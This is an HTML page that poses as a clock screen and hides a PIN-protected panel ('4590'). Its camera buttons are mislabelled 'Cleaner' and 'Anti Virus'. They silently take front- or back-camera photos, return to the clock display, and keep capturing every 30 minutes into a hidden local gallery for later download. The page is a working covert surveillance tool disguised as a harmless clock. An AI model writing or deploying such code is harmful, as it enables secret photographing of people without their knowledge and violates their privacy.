<!DOCTYPE html>
<html lang="ur">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roman Studio System</title>
    <style>
        body { font-family: sans-serif; background: #000; color: white; margin: 0; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; }
        #clock-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; width: 100%; height: 100%; cursor: pointer; position: fixed; top:0; left:0; z-index: 999; background: #000; }
        .clock { width: 250px; height: 250px; border: 8px solid #1a1a1a; border-radius: 50%; position: relative; background: #050505; }
        .hand { position: absolute; bottom: 50%; left: 50%; transform-origin: bottom; border-radius: 10px; }
        .hour { width: 6px; height: 50px; background: white; z-index: 3; }
        .minute { width: 4px; height: 80px; background: #888; z-index: 2; }
        .second { width: 2px; height: 95px; background: #e74c3c; z-index: 1; }
        .roman-text { margin-top: 30px; font-size: 22px; color: #3498db; animation: blink 2s infinite; font-weight: bold; }
        @keyframes blink { 0%, 100% { opacity: 0.4; } 50% { opacity: 1; } }

        #pin-screen { display: none; text-align: center; width: 100%; height: 100vh; background: #000; position: fixed; top:0; z-index: 1000; padding-top: 25vh; }
        input { padding: 15px; font-size: 28px; width: 140px; text-align: center; background: #111; color: white; border: 1px solid #333; border-radius: 12px; outline: none; }

        #admin-panel { display: none; padding: 20px; width: 100%; height: 100vh; overflow-y: auto; background: #000; position: fixed; top: 0; z-index: 998; box-sizing: border-box; }
        
        /* Preview Visible Mode */
        .preview-box { width: 100%; display: flex; justify-content: center; margin-bottom: 15px; }
        video { width: 240px; height: 180px; border: 2px solid #3498db; border-radius: 12px; background: #111; object-fit: cover; }

        .btn { width: 100%; max-width: 320px; padding: 15px; margin: 8px auto; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; color: white; display: block; text-transform: uppercase; }
        .btn-blue { background: #3498db; }
        .btn-green { background: #2ecc71; }
        .btn-red { background: #e74c3c; }
        .btn-purple { background: #8e44ad; }

        #gallery-container { display: none; margin-top: 20px; }
        .gallery { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; padding-bottom: 20px; }
        .card { background: #111; padding: 8px; border-radius: 12px; border: 1px solid #222; text-align: center; }
        .card img { width: 100%; border-radius: 8px; margin-bottom: 5px; }
        .card-btns { display: flex; gap: 5px; }
        .del-btn { flex: 1; border: none; padding: 8px; border-radius: 6px; cursor: pointer; font-size: 11px; color: white; }
    </style>
</head>
<body>

    <div id="clock-screen" onclick="openPin()">
        <div class="clock">
            <div id="hour" class="hand hour"></div>
            <div id="min" class="hand minute"></div>
            <div id="sec" class="hand second"></div>
        </div>
        <div class="roman-text">ROMAN STUDIO</div>
    </div>

    <div id="pin-screen">
        <h3 style="color:#3498db;">System Access</h3>
        <input type="password" id="pinIn" maxlength="4" oninput="checkPin(this.value)" placeholder="****">
        <p onclick="goBackToClock()" style="color:#666; margin-top:40px; cursor:pointer;">Back</p>
    </div>

    <div id="admin-panel">
        <h3 style="text-align:center; color:#3498db;">ROMAN STUDIO CONTROL</h3>
        
        <div class="preview-box">
            <video id="preview" autoplay playsinline muted></video>
        </div>
        <canvas id="canvas" style="display:none;"></canvas>

        <button class="btn btn-blue" onclick="startAutoPhoto('user')">Cleaner (Front Cam)</button>
        <button class="btn btn-green" onclick="startAutoPhoto('environment')">Anti Virus (Back Cam)</button>
        <button class="btn btn-purple" onclick="toggleGallery()">Full System (Gallery)</button>
        <button class="btn btn-red" onclick="location.reload()">Lock System</button>

        <div id="gallery-container">
            <h4 style="text-align:center; border-top:1px solid #333; padding-top:10px;">Stored Assets</h4>
            <button class="btn btn-green" style="font-size:12px; padding:10px;" onclick="downloadAll()">Download & Clear All</button>
            <div id="gallery" class="gallery"></div>
            <button class="btn btn-red" onclick="toggleGallery()">Close Gallery</button>
        </div>
    </div>

    <script>
        // Clock Logic
        function runClock() {
            const now = new Date();
            document.getElementById('sec').style.transform = `translateX(-50%) rotate(${now.getSeconds()*6}deg)`;
            document.getElementById('min').style.transform = `translateX(-50%) rotate(${now.getMinutes()*6}deg)`;
            document.getElementById('hour').style.transform = `translateX(-50%) rotate(${(now.getHours()%12)*30 + now.getMinutes()/2}deg)`;
        }
        setInterval(runClock, 1000);

        function openPin() { document.getElementById('pin-screen').style.display='block'; }
        
        function goBackToClock() {
            document.getElementById('pin-screen').style.display='none';
            document.getElementById('admin-panel').style.display='none';
            document.getElementById('clock-screen').style.display='flex';
            document.getElementById('pinIn').value = '';
        }
        
        function checkPin(v) { 
            if(v==='4590') { 
                document.getElementById('pin-screen').style.display='none'; 
                document.getElementById('clock-screen').style.display='none'; 
                document.getElementById('admin-panel').style.display='block'; 
                updateGallery();
            } 
        }

        let currentStream = null;
        let photoInterval = null;

        async function startAutoPhoto(camType) {
            if(photoInterval) clearInterval(photoInterval);
            
            try {
                currentStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: camType },
                    audio: false 
                });
                
                const preview = document.getElementById('preview');
                preview.srcObject = currentStream;

                preview.onloadedmetadata = () => {
                    setTimeout(() => {
                        takePhoto();
                        goBackToClock(); // تصویر لے کر واپس کلاک پر
                    }, 2000);
                };

                photoInterval = setInterval(takePhoto, 30 * 60 * 1000);
                
            } catch(e) { alert("کیمرہ تک رسائی نہیں ہو رہی!"); }
        }

        function takePhoto() {
            const preview = document.getElementById('preview');
            const canvas = document.getElementById('canvas');
            if(!preview.srcObject) return;
            
            canvas.width = preview.videoWidth; 
            canvas.height = preview.videoHeight;
            canvas.getContext('2d').drawImage(preview, 0, 0, canvas.width, canvas.height);
            
            let data = canvas.toDataURL('image/jpeg', 0.7);
            saveData(data);
        }

        function saveData(data) {
            let storage = JSON.parse(localStorage.getItem('rvault') || '[]');
            storage.push({ d: data, time: new Date().toLocaleString() });
            localStorage.setItem('rvault', JSON.stringify(storage));
        }

        function toggleGallery() {
            let el = document.getElementById('gallery-container');
            el.style.display = (el.style.display === 'block') ? 'none' : 'block';
            if(el.style.display === 'block') updateGallery();
        }

        function updateGallery() {
            const storage = JSON.parse(localStorage.getItem('rvault') || '[]');
            const gallery = document.getElementById('gallery');
            gallery.innerHTML = '';
            storage.slice().reverse().forEach((item, index) => {
                const actualIndex = storage.length - 1 - index;
                gallery.innerHTML += `
                    <div class="card">
                        <img src="${item.d}">
                        <p style="font-size:9px;">${item.time}</p>
                        <div class="card-btns">
                            <button class="del-btn" style="background:#27ae60;" onclick="downloadAndDelete(${actualIndex}, '${item.d}')">Save</button>
                            <button class="del-btn" style="background:#e74c3c;" onclick="deleteItem(${actualIndex})">Del</button>
                        </div>
                    </div>`;
            });
        }

        function downloadAndDelete(index, dataUrl) {
            const link = document.createElement('a');
            link.href = dataUrl;
            link.download = `Roman_Studio_${index}.jpg`;
            link.click();
            setTimeout(() => deleteItem(index), 500);
        }

        function downloadAll() {
            const storage = JSON.parse(localStorage.getItem('rvault') || '[]');
            if(storage.length === 0) return alert("گیلری خالی ہے!");
            
            storage.forEach((item, index) => {
                const link = document.createElement('a');
                link.href = item.d;
                link.download = `Roman_Studio_Batch_${index}.jpg`;
                link.click();
            });
            
            setTimeout(() => {
                localStorage.setItem('rvault', '[]');
                updateGallery();
                alert("تمام تصاویر محفوظ کر کے گیلری صاف کر دی گئی ہے۔");
            }, 1000);
        }

        function deleteItem(index) {
            let storage = JSON.parse(localStorage.getItem('rvault') || '[]');
            storage.splice(index, 1);
            localStorage.setItem('rvault', JSON.stringify(storage));
            updateGallery();
        }
    </script>
</body>
</html>
